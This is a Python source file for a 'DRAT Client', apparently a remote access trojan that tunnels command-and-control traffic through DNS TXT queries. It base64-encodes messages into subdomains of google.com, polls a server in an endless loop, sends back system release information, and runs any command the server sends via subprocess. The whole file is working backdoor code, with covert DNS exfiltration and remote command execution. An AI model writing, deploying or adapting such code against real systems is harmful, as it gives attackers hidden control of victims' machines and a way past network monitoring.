#!/usr/bin/python3
"""
Name: DRAT Client
Author: K4YT3X
Date Created: April 7, 2021
Last Updated: April 13, 2021
"""

# local imports
import base64
import os
import socket
import subprocess
import time
import uuid

RHOST = "127.0.0.1"
RPORT = 53


class CMD:
    ACK = 0x01
    HELLO = 0x02
    INFO = 0x03
    EXEC = 0x04
    SLEEP = 0x05


def makeQueryBytes(message: bytes) -> bytes:
    """construct the DNS query bytes to be sent

    Args:
        domain (str): domain name to send the query to

    Returns:
        bytes: bytes to be sent to the DNS server
    """

    # construct the header section
    header = []
    header.append("0")  # QR (query)
    header.append("0".zfill(4))  # OPCODE (standard query)
    header.append("0")  # AA
    header.append("0")  # TC (not truncated)
    header.append("1")  # RD (recursion desired)
    header.append("0")  # RA
    header.append("0")  # Z
    header.append("1")  # AD
    header.append("0")  # CD (non-authenticated data not accepted)
    header.append("0".zfill(4))  # RCODE
    header.append("1".zfill(16))  # QDCOUNT (1 entry)
    header.append("0".zfill(16))  # ANCOUNT
    header.append("0".zfill(16))  # NSCOUNT
    header.append("0".zfill(16))  # ARCOUNT

    # construct the question section
    question = []
    question.append("10000".zfill(16))  # QTYPE (TXT)
    question.append("1".zfill(16))  # QCLASS (IN)

    # construct the final query bytes
    query = bytes()
    # query += os.urandom(2)  # ID
    query += "AA".encode("ascii")  # temporary static ID for debugging
    query += int("".join(header), 2).to_bytes(
        len("".join(header)) // 8, byteorder="big"
    )

    # convert domain name into labels
    b64EncodedMessage = base64.b64encode(message).decode("ascii")
    domain = "{}.google.com".format(b64EncodedMessage)
    for label in domain.split("."):
        query += bytes.fromhex(format(len(label), "x").zfill(2))
        query += label.encode("ascii")
    query += b"\x00"

    # add other query parameters
    query += int("".join(question), 2).to_bytes(
        len("".join(question)) // 8, byteorder="big"
    )

    return query


def makePayload(reqId: bytes, command: int, data: bytes):
    payload = bytes()
    payload += reqId
    payload += command.to_bytes(1, "big")
    payload += data
    return payload


def unpackAnswerMessage(answer: bytes) -> bytes:
    """extract messages from a DNS answer

    Args:
        answer (bytes): answer datagram raw bytes

    Returns:
        bytes: extracted bytes
    """
    offset = 12

    # skip the labels
    while offset < len(answer) and answer[offset] != 0:
        length = answer[offset]
        offset += length + 1

    # skip irrelevant parameters
    offset += 18

    # get answer text length
    length = answer[offset]

    return base64.b64decode(answer[offset + 1 : offset + 1 + length])


def get(socketHandle: socket.socket, message: bytes) -> bytes:
    socketHandle.sendto(
        makeQueryBytes(message),
        (RHOST, RPORT),
    )
    return socketHandle.recv(4096)


def poll():
    """poll from the server every certain time interval"""
    # use context to make sure the handle closes after use
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as socketHandle:

        # wait for a maximum of 5 seconds for responses
        socketHandle.settimeout(5)

        # send client HELLO to server and ask for what to do
        answer = get(socketHandle, makePayload(uuid.uuid4().bytes, CMD.HELLO, b"\x00"))

        while True:

            message = unpackAnswerMessage(answer)
            reqId = message[0:16]
            command = message[16]
            data = message[17:]

            if command == CMD.INFO:
                uname = os.uname()
                answer = get(
                    socketHandle,
                    makePayload(
                        reqId,
                        CMD.INFO,
                        f"release={uname.release}".encode("utf8"),
                    ),
                )

            elif command == CMD.EXEC:
                process = subprocess.run(
                    data.decode("utf8").split(" "),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                # answer = get(socketHandle, makePayload(reqId, CMD.EXEC, process.stdout))
                answer = get(
                    socketHandle,
                    makePayload(
                        reqId, CMD.EXEC, str(process.returncode).encode("ascii")
                    ),
                )

            elif command == CMD.SLEEP:
                return


def main():
    """the main control function"""

    # the main loop will run polls indefinitely
    while True:
        poll()

        # poll interval is set to 60 seconds
        time.sleep(10)


if __name__ == "__main__":
    main()
